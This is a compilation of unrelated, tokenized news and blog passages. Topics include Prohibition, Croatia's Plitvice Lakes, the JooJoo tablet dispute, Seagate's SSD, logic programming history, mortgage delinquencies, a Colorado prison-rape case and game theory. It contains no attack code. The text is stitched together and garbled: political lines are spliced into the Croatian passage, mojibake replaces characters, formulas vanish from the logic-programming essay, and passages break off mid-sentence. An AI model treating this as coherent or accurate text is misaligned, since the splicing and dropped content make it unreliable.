On Dec. 5 , 1933 , Americans liberated themselves from a legal nightmare called Prohibition by repealing the 18th Amendment to the Constitution .
Today most people think Prohibition was fueled by puritanical Protestants who believed drinking alcohol was a sin .
But the vocal minority who made Prohibition law believed they were marching in the footsteps of the abolitionists who sponsored a civil war to end another moral evil — slavery .
At least as important was the belief that Prohibition would produce health ...

TEMPERATURE koje su se proteklih dana spuštale i do sibirskih - 20 stupnjeva zamrznule su najpoznatiji hrvatski nacionalni park , a po mnogima i najljepši - Plitvička jezera .
Prizor je to koji je zateknute znatiželjnike ostavio bez daha , a kako i ne bi , jer ne viđamo ga baš često .
Nacionalni park se sastoji od 16 jezera , koja se stepenasto prelijevaju i silaze jedno u drugo u nizu od 5460 m zračne linije , a dijele se na Gornja i Donja jezera .
Natapaju ih vode Crne i Bijele rijeke s pritoka te Rječica i njene pritoke .
Bogata je izvorima , tipičnim krškim vrelima nastalima na rasjedima propusnih i nepropusnih geoloških formacija .
Prema legendi , Plitvička su jezera nastala nakon velike suše .
Ljudi , životinje i bilje , čeznuli su za kapljicom vode .
Narod se molio i molio .
Tada se u dolini pojavi Crna Kraljica sa svojom veličanstvenom pratnjom ; ona se smilovala narodu i uz jak vjetar i grmljavinu na zemlju je konačno pala kiša .
Kiša je padala tako dugo , dok razina vode nije narasla dovoljno , da oformi jezera .
Trump says it would destroy us .
Biden needs the voters who support it ( especially the Bernie voters ) .

CrunchPad , the touchscreen tablet that was declared dead a week ago by its impresario inventor Michael Arrington , is back .
A Singapore - based company , Fusion Garage , announced plans to introduce the device under a new name : JooJoo .
JooJoo will have a 12.1 - inch capacitive touchscreen , 4 GB solid state drive , an accelerometer that will allow it to switch between landscape and portrait modes , Wi-Fi connectivity and a battery life of up to five hours .
It will run a custom - designed operating system that will allow the machine to boot in nine seconds and access the internet near - instantaneously .
But instead of the initial price point of $ 200 , JooJoo will now cost $ 500 .
__Hands - On with the JooJoo
__The JooJoo is an interesting gadget only if you buy into the premise of a completely web - oriented lifestyle .
Though it seems to have the hardware design and form factor right , the list of what it ca n’t do , for now , outweighs what it can .
Check out our impressions of the JooJoo tablet 's user interface , hardware and limitations .
" It 's a product whose death has been greatly exaggerated , " says Chandrasekar Rathakrishnan , CEO and founder of Fusion Garage , which until last week was working with Arrington to design the device .
Rathakrishnan showed the device , seen above , in a web conference Monday , and will be following that up with hands - up demos to the press later in the day .
( The green hue of the screen is caused by the video camera used , Rathakrishnan claimed . )
Fusion Garage will start taking pre-orders for the device December 11th , and will deliver it in 8 - 10 weeks , says Rathakrishnan .
The launch of JooJoo is yet another twist in the strange tale of a tablet device that first surfaced last year .
Arrington floated the idea of a tablet in June 2008 when he talked of a touchscreen device that would run Firefox and Skype on top of a Linux kernel .
The tablet would have low - end hardware — a power button , a headphone jack , speakers , a microphone and a built - in camera for video .
It would come with Wi -Fi , 512 MB of memory , a 4 - GB solid - state hard drive and no keyboard .
All this for $ 200 .
The idea seemed promising , especially because other major PC makers including Apple and Dell are reportedly working on tablets due for launch next year .
The notion of a tablet capable of showing large , interactive text and graphics has excited magazine publishers , including Wired 's corporate parent Condé Nast , which is among several companies planning tablet - based magazine apps .
Time Inc. also recently showed a slick tablet concept video for Sports Illustrated .
But after repeated delays , Arrington declared the CrunchPad project dead last week .
Arrington accused Fusion Garage of cutting him out of the deal .
Based on pressure from shareholders , Fusion Garage had decided to move forward and sell the device directly without TechCrunch 's involvement , said Arrington , who has said he will pursue legal action against Fusion Garage .
Rathakrishnan says his company cut Arrington out because Fusion Garage " designed , funded and developed the product , " with Arrington failing to deliver on any of his promises .
" There are dreamers and there are doers , " he says .
" Fusion Garage is the only actual doer in this story . "
Rathakrishnan says he reached out to Arrington in 2008 after he read the latter 's post about the need for an inexpensive web tablet .
Arrington , in turn , offered to introduce Fusion Garage to hardware designers , and investors , he says .
Ultimately , TechCrunch wanted to acquire Fusion Garage .
" But nothing tangible came out of it , " claims Rathakrishnan .
" Michael was unable to deliver . "
" There 's talk and then there 's action , " he says .
" We completed development of our OS , hired the expertise to make key hardware design decisions , develop the platform and a new finished prototype .
And we secured our own funding . "
That 's why Fusion Garage owns the IP to the product and can introduce it without having Arrington or CrunchPad associated with it , says Rathakrishnan .
Meanwhile , Arringon has threatened to file a lawsuit against Fusion Garage .
But so far , no case has been filed .
Rathakrishan claims no contracts were ever signed between Fusion Garage and TechCrunch around the CrunchPad .
When Arrington first talked about the project , critics pointed out that its projects $ 200 pricetag and aggressive timeline were unrealistic , given the ambitious features Arrington had planned .
Production costs and a challenging retail environment would eat into profit margins , they said .
And they were right , says Rathakrishnan .
" There are dreams and there are hallucinations , " he says .
" Arrington 's dreams of $ 200 - $ 300 are as real as his claims of IP ownership .
Nothing worthwhile can be delivered at that price . "
So far Fusion Garage has raised $ 3 million in funding and is set to announce an additional round of investment shortly , says Rathakrishnan .
As for marketing muscle that TechCrunch or Arrington could have provided , Rathakrishnan says its something that Fusion Garage wo n't really miss .
" Writing blog posts is not marketing , " he says .
" If marketing was only about talk , we would have seen a successful tablet years ago .
Microsoft has been talking about tablets for years .
TechCrunch 's marketing capability is defined to a blog . "
Arrington did not reply to a request for comment .

Now hear this , you blood - hungry sons of war !
As of oh - nine - hundred Eastern Standard time , we are at WAR with the DEMOMAN !
That one - eyed bagpipe - playing sonofabitch has been a thorn in our collective sides for long enough !
For THIS WEEK ONLY , each and every man brave enough to fight under the Soldier banner will be KILLING DEMOS !
Gentlemen , there comes a time in a man ’s life when when HE MUST DRAW LINES !
Friendship is FINE for tea parties and shopping trips to the dress store !
But when the chips are down , a soldier puts ASIDE friendship for the good of WAR !
Every Demoman gutted , garroted , exploded or otherwise killed by a Soldier will mean a POINT for the Soldier Team !
At the end of this week , when the points are tallied AND WE ARE FOUND TO HAVE MORE , we will be awarded an EXCLUSIVE ONE - OF - A - KIND WEAPON .
Gentlemen , I have NO IDEA what this weapon is .
I do n’t even know if I ’ll WANT it .
But BY GOD , I know what ’s IMPORTANT , and it ’s that WE get it and the DEMOMAN DOES NOT .
Am I understood ?
Then get out there and KILL !
With each entry you 'll get not only a comic poking fun at the movie , but also a detailed review .
Joe 's not educated in film or cinematography or acting , he 's just a guy that draws comics and likes movies .
So if you 're looking for the everyman perspective and a little joke in comic form ... you 're in the right place .
Joe Loves Crappy Movies is by Joseph Dunn .
Joe willingly goes to see the very worst that Hollywood has to offer .
Whenever a crappy movie comes out Joe will be there to see it , make fun of it , and actually review it .
Nothing is safe , and nothing is sacred .
From the big budget action disasters to the low brow fart based comedies , to anything starring Martin Lawrence ?
Joe will tear it apart .
Love crappy movies but are too ashamed to admit it ?
Are you a big Rob Schneider fan but you 're tired of being burned ?
Not sure if you want to waste your money on the same old movie ?
That 's why you have Joe .
Joe �
The creator of the strip who has embraced giving crappy movies the chance they deserve .
Like the majority of the cast he�s obsessed with boobs .
First Appearance - The Introduction
Yeo �
Yeo is Joe�s wife and often the voice of reason in the strip .
Having her act rational allows the rest of the cast to embrace being in a comic strip which primarily involves randomly punching people , interacting with fictional characters and talking about boobs .
Yeo is smart , beautiful and way too good for Joe .
Don�t tip her off .
First Appearance - Fever Pitch
Irv � Joe�s movie - going sidekick who�s always down for watching Jason Statham crescent moon kick some thug through a plate glass window and getting some drinks before after and during a Vin Diesel movie .
Like the majority of the cast he�s obsessed with boobs .
First Appearance - Ong - Bak : The Thai Warrior
Agent 337 George Jones �
A government Agent that took over for Joe after he was bad - mouthing President Bush in the V for Vendetta strip .
George ran the show for over a month bring a much needed sense of patriotism and justice to both the strips and reviews .
He eventually got too attached to his work , empathizing with Joe�s plight to give crappy movies a fair shake .
In a way he came to love crappy movies as well and was pushed out of the position .
He spiraled out of control and ended up in prison .
His adventures will be told in the limited series JLCM Presents : 337 Locked Up which is set to d�but Christmas of 09 .

Another lawsuit waiting to happen is Jean Luc Picard who , towards the end of the strip�s first year , became the go - to background character .
If there was ever a seat to fill or a random person to place wandering around in the background , nine times out of ten it was Picard .
While Picard has crossed paths with Irv he and Joe have never met .
Perhaps they will some day but for now just can an eye on the background .

Editorial : Homosexuality in nature is no guide to morality
NOT long ago , the news was full of reports about two male Humboldt penguins at a zoo in Germany that adopted an egg , hatched it and reared the chick together .
It seems like every time you turn around , the media spotlight has fallen on another example of same - sex liaisons in the animal kingdom .
In the past few years , the ubiquity of such behaviour has become apparent .
This summer evolutionary biologists Marlene Zuk and Nathan Bailey from the University of California , Riverside , published a paper on the subject that included examples from dozens of species ranging from dung flies and woodpeckers to bison and macaques .
That is just the beginning of the story .
The burning question is why same - sex behaviour would evolve at all when it runs counter to evolutionary principles .
But does it ?
In fact there are many good reasons for same - sex sexual behaviour .
What ’s more , Zuk and Bailey suggest that in a species where it is common , it is an important driving force in evolution .
Although terms such as homosexual , gay and transgender are commonly used by the mass media , and even by some ethologists , Bailey and Zuk believe you should n’t extend these descriptors of human sexuality to animals .
“ It ’s not simply that they are burdened with the weight of social , moral and political implications , which can obscure objective scientific study , ” says Bailey .
“ The problem is that while we can observe the sexual behaviour of …
Seagate tosses its hat into the solid state drive ( SSD ) market today with the unveiling of its Pulsar drive , a unit aimed at enterprise - level blade and server applications .
The new drive stores up to 200GB of data in a 2.5 - inch form factor with a SATA interface .
With the Pulsar drive , Seagate lays claim to being " the first enterprise HDD vendor to deliver an enterprise - class SSD solution . "
The Pulsar drive is built with single - layer - cell ( SLC ) technology , which Seagate says enhances the reliability and durability of the SSD .
Solid state drives offer much faster data access speeds than the rotating media in conventional hard disk drives ( HDDs ) since there are no moving parts .
According to Seagate , the Pulsar drive achieves a peak performance of 30,000 read IOPS ( input / output operations per second ) and 25,000 write IOPS , which is a measure of how a drive processes small , random blocks of information .
The drive is rated at up to 240 megabytes per second for sequential reads and 200 mbps for sequential writes ; a measure of how it accesses large chunks of contiguous data .
The drive comes with a five - year warranty and has an annualized failure rate ( AFR ) of 0.44 percent , according to Seagate .
" Seagate is optimistic about the enterprise SSD opportunity and views the product category as enabling expansion of the overall storage market for both SSDs and HDDs , " said Dave Mosley , Seagate 's executive vice president for sales , marketing , and product line management in a press release .
Solid state drives built with single layer cell technology can offer faster read / write speeds than those built with multiple layer cell technology ( MLC ) , but MLC drives can offer more storage .
The Pulsar drive , which was made available to select OEM ( original equipment manufacturer ) customers in September , is now available to all OEMs .
A Possible Future History of Logic Programming M.H. van Emden Computer Science Dept , University of Victoria
The PDF - version of this article can be found here .
While it is well - known that it is hard to know anything about the future , it is less widely realized that it is also difficult to understand the present .
It is therefore paradoxical that it sometimes helps to understand the present by means of a fictitious future history .
In this article I am going to exploit this paradox .
I place the viewpoint well away into the future .
Again this may seem paradoxical , because in computing everything is supposed to happen fast .
Not everybody thinks so .
Paul Graham has embarked on a project that he calls " The Hundred Year Language " pointing out that it is only hardware that changes fast .
Programming languages change slowly .
This is because they are part of culture ; they reflect how human minds tackle problems .
Hence Graham's ``Hundred Year Language '' .
It so happens that Graham is concerned with Lisp .
This is not the only paradigm in need of the long - term perspective .
Accordingly , I imagine a history of logic programming as it may be written in the 2020s .
As I 'm already exercising your indulgence with speculation , I will not attempt the fictitious future history itself , but instead bring out the salient points in an equally fictitious review of this nonexistent history .
When the first edition of Senner 's history came out in 2020 , it was widely praised for its compelling view of the development over many decades of logic programming .
Reviewers praised it for its broad perspective , but deplored its lack of historical detail .
Since then several collections of papers have made their way from estates via the auctions to various libraries .
Senner has taken this opportunity to incorporate these recent findings in a new edition .
What has not changed in the new edition , and this is what I take issue with , is that Senner presents the development of logic programming as a relentless forward march towards an inevitable outcome .
Of course , it is true that not a decade went by without some of the building blocks being fashioned that we take for granted as part of the majestic edifice that now dominates the landscape of programming .
The way Senner tells it , and his readers love him for it , is that there was a continuous forward movement .
This certainly makes for a good story .
But it does not recognize the fact that the received view of history is only as recent as the Tens .
What I 'm now asking the reader to imagine , Senner 's book in hand , what the situation of logic programming must have looked like in the mid Zeroes .
I think you will agree that Senner 's story of a relentless march forward is an artifact of 20/20 hindsight .
Let us imagine it is 2004 , to pick a representative year in the mid Zeroes .
The great contributions of the Nineties are known ; they were even widely celebrated .
But were they known , in 2004 , as contributions to logic programming ?
Senner , of course , does not say so .
But he makes it easy to overlook the fact that in 2004 nobody seemed to recognize as such the contributions of the Nineties to logic programming .
Let us consider three of these contributions here : the XML movement , the compilation / execution model based on virtual machines , and constraint programming .
The XML movement , which arose from the World - Wide Web in the mid Nineties , can be characterized as exploiting the tree as universal datastructure .
We now view this as a useful further stage in a development that started in the early Seventies .
But if you would have whispered " Colmerauer " into the ear of an XML devotee , you would have met with a blank stare .
Following it up with a heavy hint like " Prolog " would n't change anything .
Nor were the few remaining logic programmers excited by the XML movement .
They regarded it as part of the big , bad , ugly outside world that had robbed them of their lawful place in the limelight .
From their point of view , XML and all its works was only something to reluctantly accommodate with yet another ad hoc interface , not something to be embraced as a tree technology to serve as the foundation of a new version of Prolog .
From our present vantage point it is difficult to imagine how compartmentalized computing was at the time .
From our vantage point , the year 2004 is indeed a year of delicious ironies .
XSLT was already gathering a following , with its adherents discovering that one could do all kinds of computational tasks as transformations on ( XML ) trees .
Working from the other side , Yeow , working with WAM experts Horspool and Levy , had shown in a 2002 paper that parts of the WAM design could be used for a much faster XML parser .
Yet the penny had not dropped .
Another innovation in which the Prolog of the Eighties was hopelessly far ahead of its time was execution via a virtual machine .
At the time , Prolog advocates pointed out that when Prolog returns the answer to the user in 100 milliseconds , it is irrelevant that a lower - level implementation executes in 10 milliseconds .
To no avail .
The very fact that Prolog was ``interpreted '' marked it as unfit for the ``real world ' ' .
One of the great contributions of the Nineties was the ``real world '' discovering the advantages of the compilation / execution model of WAM based Prolog in the form of the Java Virtual Machine1 .
Perhaps in some quarters it was still somewhat suspect , SUN being a notoriously innovative company .
The last doubts disappeared when this model was adopted for by a company that stood far above any suspicions of innovativity .
The third important development of the Nineties is constraint programming .
Here especially Senner fails to give a sense of the many fumbling steps that were taken towards the software architecture of logic programming that we now take for granted .
Indeed , we now take it so much for granted that a brief tutorial on the basics may be needed .
In the mid Seventies , it was customary to distinguish " Prolog " from " Pure Prolog " .
The latter was almost the same as the use of SLD resolution with Horn clause programs .
In Pure Prolog one can perform transformations of trees containing symbolic values only .
Counting and arithmetic have to be simulated by such symbolic computation .
To allow access to the processor 's arithmetic , Colmerauer and Roussel had already added extra-logical features to Pure Prolog .
Though this resulted in a practical language , it made it difficult to characterize the class of program - query pairs that yield logical consequences .
Colmerauer himself would probably not have agreed to this analysis of Prolog .
For him Prolog was not part of logic programming .
For him Pure Prolog was not an inviolable given just because it was resolution theorem - proving .
He clarified his position by showing that Pure Prolog itself should be decomposed by regarding unification as constraint - solving over terms .
The immediate use of this was to clarify the controversy over the occurrence check in unification .
Colmerauer showed that constraint solving over finite terms ( which are the constituents of Herbrand universes ) corresponds to unification with occurrence check .
He presented a unification algorithm that is more efficient by omitting the occurrence check and showed that this algorithm can be viewed as constraint solving over rational terms .
Let us denote by constraint programming over a structure S. embraces not only a structure in the sense of model theory ( consisting of a carrier , constant elements , constants , relation symbols , function symbols ) , but also a system of efficiently representable sets of values and efficiently computable contraction operators for the constraints .
A good way to illustrate the distinction between and S is to consider the structure R of the reals .
Constraint programming over R adds to R a system of selecting certain sets of reals as efficiently representable as intervals .
It also adds contraction operators for these intervals corresponding to constraints over the reals such as the ternary sum constraint x + y = z and the ternary product constraint x x y = z .
Similarly the structure of ground Herbrand terms can be enriched by adding a system for efficiently representing certain sets of ground terms .
The preferred system is to use a term to represent the set of its variable - free instances .
This efficiently represents a sufficiently rich repertoire of sets of ground terms .
The constraint is equality and the efficiently computable contraction operator is unification .
This gives .
The same method , but starting with the structure of rational ground terms gives .
The deconstruction of Pure Prolog suggested by Colmerauer 's work would now be written as :
Colmerauer was more interested in
and was not concerned with the fact that it is not a form of resolution theorem proving .
Colmerauer 's work in the late Seventies was concerned with justifying unification without the occurrence check .
The deconstruction of Pure Prolog is implied .
It was made explicit by Jaffar and Lassez in their CLP Scheme .
It is for this reason that the core that remains of Pure Prolog after separating unification is called " Schematic Prolog " .
The CLP Scheme explicitly allows the addition of any number of constraint programming structures to Schematic Prolog .
For example ,
( 1 )
is an interesting Prolog , as it uses the techniques of interval arithmetic to obtain a logically sound method for the approximate solution of equations over the reals .
The answer constraints are in the form of membership of intervals with floating point numbers as bounds .
This soundness of these answers is not affected by the inevitable rounding errors that occur in the computation of these answers .
By incorporating machine arithmetic into Prolog in this way , an important motivation for the extra-logical features of the original Prolog had disappeared .
By 2004 several important CP structures were known .
We already mentioned , , and .
Finite - domain constraints fit in this framework .
The representable sets include the entire powerset .
The constraints are equality , disequality , and .
We call the resulting system .
Boolean constraints were well known .
Although constraint programming over integers had played an important role since CHIP , it was still not soundly implemented because integer overflow invalidated the result if it occurred .
But of course , plus the unary integer constraint in principle made available .
Thus , in 2004 , there were no obstacles to a Prolog that extends ( 1 ) by including also , , , and .
Yet the only forms of Prolog that existed at the time were basically the Prolog that emerged in the Seventies .
The innovations beyond that were restricted to implementation in WAM .
The connection to constraint programming only existed by Prolog being a front - end to CP implementations .
The software and logic architecture suggested by the equation was still to come .
So much for Senner 's suggestion of the development of Prolog as a relentless march forward .
A decade went by before the great advances of the Nineties to logic programming were recognized as such and exploited accordingly .
It must have been a dark decade in which XML , virtual machines , and constraint programming wandered around aimlessly , unaware of their true destiny .

I received a very unexpected email last week asking if I ’d like to check out a hidden prohibition - era bowling alley in Queens .
Uh , yes , definitely interested .
I took a trip to see it today – Just incredible :
According to the owner , the bowling lanes were hidden under boxes and boxes of junk .
After researching the property , the owner now believes the basement was a speak - easy club during the Prohibition Era , with two bowling lanes to entertain customers .
The building itself was once a small garment factory in the early 1900 ’s , employing local women to work the sewing machines and men to keep the equipment running smoothly ( often husbands and wives ) .
This is the main room , where as many as 50 ladies would be operating sewing machines ( though I was told it was not the sweat shop conditions one would assume ) :
What was going on in the basement , however , is a different story …
Each lane features two shallow gutters …
… with wood panels set at the ends to keep pins from bouncing out of the lanes ( the pins were set - up by hand , of course ) :
Incredibly , the right lane still has a hanging cushion to stop the balls :
You can see it better below .
Also note the screen on the right :
Incredibly , the cushion still hangs to this day by a pair of rusty iron hooks :
Lining the outer lane are several decorative poles :
Each is a dark - stained wood and features several ornamental rings :
A close - up ( one can only imagine the parties these have been around for ) :
The wood on the lanes is in great shape .
There are a few holes toward the starts …
But this is pretty much the only damage for the entire run :
Numerous entrances and exits throughout the property would have facilitated discreet access .
The owner is interested in any offers for film , television , commercial , or photographic use .
He suggested it as very appropriate for a show like Cold Case , and I totally agree .
Pretty much any production looking for an authentic relic of a prohibition - era club could do wonders with this space , a VERY rare find .
The upstairs is also available .
If you are interested , send me an e-mail and I will forward it on to the owner .
And PLEASE , if you have something like this in your basement or attic or rooftop or whatever , drop me a line !

OAKLAND --
This city wants to heat up its nightclub and bar scene by relaxing local cabaret laws that govern its late - night venues .
That 's raising safety concerns in a town that already has a reputation for crime .
Andrew Jones is one of those who 's concerned .
Mr. Jones , a service manager for the Downtown Oakland Association and Lake Merritt / Uptown Association , says the city has to get a handle on its crime problem -- such as shootouts and robberies -- before it expands its club scene .

In spite of all the efforts to date Serious U.S. mortgage delinquencies up 20 percent .
Serious delinquencies among U.S. prime mortgages rose nearly 20 percent in the third quarter from the prior quarter , as the percentage of current and performing mortgages fell for the sixth consecutive quarter , banking regulators said on Monday .
The report by the Office of Comptroller of the Currency and the Office of Thrift Supervision , which are part of the Treasury Department , covered about two - thirds of all U.S. mortgages .
It found 3.6 percent of prime mortgages -- those made to the most credit - worthy borrowers -- were seriously delinquent in the third quarter .
That was more than double the year - ago quarter and up nearly 20 percent from the 2009 second quarter .
Big U.S. banks and thrifts carried out 2.4 million home loan modifications , trial period plans or payment plans in the quarter , spurred mostly by a government plan offered by President Barack Obama , according to the report .
But only 1 percent of those had been converted to permanent modifications as of September 30 , 2009 , the report said .
A major cause of this disconnect is that loan servicers are finding that many borrowers who initially appear to qualify for the program do not , according to the report .
OCC and OTS Mortgage Metrics Report Third Quarter 2009
National bank and thrift servicers implemented more than 680,000 home loan modifications and payment plans in the third quarter of 2009 to avoid preventable foreclosures , according to a report released today by the Office of the Comptroller of the Currency and the Office of Thrift Supervision .
The OCC and OTS Mortgage Metrics Report for the Third Quarter 2009 showed that the number represented a nearly 69 percent increase in home retention actions from the previous quarter .
Despite progress in this area , the percentage of current and performing mortgages dropped for the sixth consecutive quarter to 87 percent of the servicing portfolio , serious delinquencies rose to 6.2 percent , and foreclosures in process surpassed 1 million mortgages , or about 3.2 percent of the servicing portfolio .
Of particular note was the deterioration among prime mortgages , the largest category of mortgages .
Serious delinquencies at the end of the third quarter increased to 3.6 percent of prime mortgages , up almost 20 percent from the previous quarter and more than double a year ago .
The percentage of modified loans 60 or more days delinquent or in process of foreclosure increased steadily in the months subsequent to modification ( see Table 2 ) .
Modifications made after the third quarter of 2008 appeared to perform relatively better than older vintages .
The most recent modifications made in the second quarter of 2009 had the lowest percentage of mortgages ( 18.7 percent ) that were 60 or more days delinquent three months subsequent to modification .
This lower three - month re-default rate may be an early indicator of sustainability for loan modifications that reduce monthly payments .
Redefaults On Modified Loans

Modifications on loans held in the servicers ’ own portfolios continued to perform better than loans serviced for others .
This difference may be attributable to differences in modification programs and the servicers ’ flexibility to modify loan terms to achieve greater affordability and sustainability .
Modified government - guaranteed loans showed the highest delinquency rates at 6 , 9 , and 12 months following modification relative to other investor loan types ( see Table 3 ) .

Completed foreclosures increased 11.9 percent from the prior quarter , reflecting the increasing inventory of foreclosures in process .
New short sales increased by 22.4 percent to 30,766 as a result of an increased emphasis on this loss mitigation approach by homeowners seeking an alternative to foreclosure but either can not or do not wish to stay in their homes ( see Table 6 ) .

It has been expected for weeks , and today Notre Dame quarterback Jimmy Clausen said that it ’s official :
He ’s entering the NFL draft .
Clausen , who will make a formal announcement today , said ex-Notre Dame coach Charlie Weis , who knows something about NFL offenses , told him he ’s ready to play at the next level .
“ After the season , in talking to my parents and obviously Coach Weis , I just feel it ’s the right time , ” Clausen told ESPN.com .
“ Coach Weis told me whether he was going to be here or not be here , it was time for me to go .
He thought I ’ve improved so much since I came to Notre Dame .
So , I ’m taking his advice , and I ’m going to head out . ”
Clausen is viewed as one of the top two or three quarterbacks in this year ’s draft , with Washington ’s Jake Locker and Oklahoma ’s Sam Bradford ( if there are no concerns about the long - term health of his shoulder ) being the other quarterbacks with first - round grades in the 2010 draft .
Clausen said he thinks he ’s as ready for the NFL as a college quarterback can be .
“ The scrutiny of being the quarterback at Notre Dame and the head coach at Notre Dame is tough , ” Clausen said .
“ And I think it ’ll prepare me really well for the next level . ”

After paying a $ 70,000 settlement for failing to protect a burglar from a known prison rapist , the Colorado Department of Corrections has now transferred that burglar to a new home — surrounded by sex offenders .
James Mervin says he has nightmares and sleeps only a few hours at a time at Fremont Correctional Facility , where 76 percent of the population are sex offenders .
“ I try not to get in a deep sleep , ” Mervin said in a recent interview at the Cañon City facility .
“ I have these night terrors , flashbacks .
It ’s horrible .
It ’s like I ’m being raped again .
It ’s like someone is overpowering you .
You feel worthless , degraded . ”
Mervin , who agreed to allow publication of his name , was raped in 1993 by serial killer Marvin Gray , just days after Gray had raped another inmate .
In 2000 , the DOC paid Mervin $ 70,000 to settle his claims over that incident .
Now , DOC officials have told Mervin he has his own bad behavior to blame for his placement at Fremont in May .
Mervin has gotten into trouble so often that he created his “ own crisis , ” said a July 30 letter to Mervin from Paul Hollenbeck , DOC ’s classification chief .
Because of the inmate ’s security level he can only be held in 11 of the system ’s 23 prisons , and many of the eligible ones are off - limits to him because of conflicts he ’d had with inmates at those prisons .
“ If you chose to behave differently , there would be more options open for your placement , ” Hollenbeck said .
Now Mervin , who is serving a life sentence for breaking into hundreds of homes , has written 28 complaint letters .
He said he dreads the next assault and vows a new lawsuit .
“ I feel like I am suffocating , ” Mervin said in a June 12 grievance letter .
It may appear on the surface that sending a rape victim to Fremont is a bad decision , but there are many factors that determine placements in a system with more than 20,000 male prisoners , DOC spokeswoman Alison Morgan said .
DOC keeps inmates apart for myriad reasons , including fighting and gang conflicts , Morgan said .
Mervin has been transferred to nine prisons since 1993 in part because of getting into fights .
Within DOC , every prison houses some sex offenders , although not as many as Fremont , she said .
“ If ( Fremont ) is the safest place for him to be , that ’s where we are going to send him , ” Morgan said .
She added that three other institutional rape victims are also housed at Fremont .
Mervin said his fights or conflicts with other inmates were directly related to his rape .
Inmates aligned with his original attacker , Marvin Gray , a leader of a white supremacist gang at the Colorado State Penitentiary , have repeatedly attacked him , he said , calling him a snitch and taunting him for being raped .
“ They have n’t protected me , ” he said of DOC .
“ I ’ve had to protect myself . ”
In 1993 , Mervin had words with a corrections officer , and was reassigned to share a cell with Gray , a 300 - pound man capable of bench - pressing 500 pounds .
That was just days after another inmate had reported being raped by Gray and was removed from the cell .
Mervin was beaten and raped that night .
The way the prison culture works , prison rape victims keep quiet and keep getting raped , Mervin said .
“ They are supposed to go to their corner to lick their wounds , ” he said .
Mervin bucked the system and sought an attorney .
The decision has haunted him ever since , he said .
He said Limon correctional officers told other inmates that he was a snitch and to retaliate against him for filing a lawsuit .
Thereafter , he was often confronted by members of the “ 211 Gang , ” and the “ Aryan Syndicate Gang , ” both white supremacist gangs .
He extended his arms out over a table in the Fremont prison visitor ’s room to show where inmates had slashed him with a shank , or prison knife .
In an inventory of his injuries , he recounted a broken thumb , a broken ankle , a dislocated shoulder , a broken jaw and burns when an inmate threw boiling water on him .
“ What am I supposed to do , keep fighting ? ”

As World War II took hold , Rolex benefited from its growing reputation and unofficially became the brand of choice amongst British Royal Air Force pilots .
Of course as captured pilots became prisoners their watches were confiscated , and when he caught wind of the situation the company ’s founder – Hans Wilsdorf – offered to replace them , on the understanding that payment would be provided after the war .
Below is a fascinating note sent to prisoner of war Corporal Clive Nutting , by Wilsdorf himself , acknowledging receipt of such an order .
Even more fascinating is the following : Nutting was a prisoner at Stalag Luft III , the camp from which 76 men ( Nutting not included ) famously attempted to flee just a year later , and he apparently needed the Oyster chronograph in order to time certain aspects of his comrades ’ escape .
In the early 1960s Nutting also worked as a consultant on The Great Escape , a movie based on the attempt .

Computer scientists have spent decades developing techniques for answering a single question :
How long does a given calculation take to perform ?
Constantinos Daskalakis , an assistant professor in MIT ’s Computer Science and Artificial Intelligence Laboratory , has exported those techniques to game theory , a branch of mathematics with applications in economics , traffic management — on both the Internet and the interstate — and biology , among other things .
By showing that some common game - theoretical problems are so hard that they ’d take the lifetime of the universe to solve , Daskalakis is suggesting that they can’t accurately represent what happens in the real world .
Game theory is a way to mathematically describe strategic reasoning — of competitors in a market , or drivers on a highway or predators in a habitat .
In the last five years alone , the Nobel Prize in economics has twice been awarded to game theorists for their analyses of multilateral treaty negotiations , price wars , public auctions and taxation strategies , among other topics .
In game theory , a “ game ” is any mathematical model that correlates different player strategies with different outcomes .
One of the simplest examples is the penalty - kick game :
In soccer , a penalty kick gives the offensive player a shot on goal with only the goalie defending .
The goalie has so little reaction time that she has to guess which half of the goal to protect just as the ball is struck ; the shooter tries to go the opposite way .
In the game - theory version , the goalie always wins if both players pick the same half of the goal , and the shooter wins if they pick different halves .
So each player has two strategies — go left or go right — and there are two outcomes — kicker wins or goalie wins .
It ’s probably obvious that the best strategy for both players is to randomly go left or right with equal probability ; that way , both will win about half the time .
And indeed , that pair of strategies is what ’s called the “ Nash equilibrium ” for the game .
Named for John Nash — who taught at MIT and whose life was the basis for the movie A Beautiful Mind — the Nash equilibrium is the point in a game where the players have found strategies that none has the incentive to change unilaterally .
In this case , for instance , neither player can improve her outcome by going one direction more often than the other .
Of course , most games are more complicated than the penalty - kick game , and their Nash equilibria are more difficult to calculate .
But the reason the Nash equilibrium is associated with Nash ’s name — and not the names of other mathematicians who , over the preceding century , had described Nash equilibria for particular games — is that Nash was the first to prove that every game must have a Nash equilibrium .
Many economists assume that , while the Nash equilibrium for a particular market may be hard to find , once found , it will accurately describe the market ’s behavior .
Daskalakis ’s doctoral thesis — which won the Association for Computing Machinery ’s 2008 dissertation prize — casts doubts on that assumption .
Daskalakis , working with Christos Papadimitriou of the University of California , Berkeley , and the University of Liverpool ’s Paul Goldberg , has shown that for some games , the Nash equilibrium is so hard to calculate that all the computers in the world could n’t find it in the lifetime of the universe .
And in those cases , Daskalakis believes , human beings playing the game probably have n’t found it either .
In the real world , competitors in a market or drivers on a highway do n’t ( usually ) calculate the Nash equilibria for their particular games and then adopt the resulting strategies .
Rather , they tend to calculate the strategies that will maximize their own outcomes given the current state of play .
But if one player shifts strategies , the other players will shift strategies in response , which will drive the first player to shift strategies again , and so on .
This kind of feedback will eventually converge toward equilibrium : in the penalty - kick game , for example , if the goalie tries going in one direction more than half the time , the kicker can punish her by always going the opposite direction .
But , Daskalakis argues , feedback wo n’t find the equilibrium more rapidly than computers could calculate it .
The argument has some empirical support .
Approximations of the Nash equilibrium for two - player poker have been calculated , and professional poker players tend to adhere to them — particularly if they ’ve read any of the many books or articles on game theory ’s implications for poker .
The Nash equilibrium for three - player poker , however , is intractably hard to calculate , and professional poker players do n’t seem to have found it .
How can we tell ?
Daskalakis ’s thesis showed that the Nash equilibrium belongs to a set of problems that is well studied in computer science : those whose solutions may be hard to find but are always relatively easy to verify .
The canonical example of such a problem is the factoring of a large number :
The solution seems to require trying out lots of different possibilities , but verifying an answer just requires multiplying a few numbers together .
In the case of Nash equilibria , however , the solutions are much more complicated than a list of prime numbers .
The Nash equilibrium for three - person Texas hold ’em , for instance , would consist of a huge set of strategies for any possible combination of players ’ cards , dealers ’ cards , and players ’ bets .
Exhaustively characterizing a given player ’s set of strategies is complicated enough in itself , but to the extent that professional poker players ’ strategies in three - player games can be characterized , they do n’t appear to be in equilibrium .
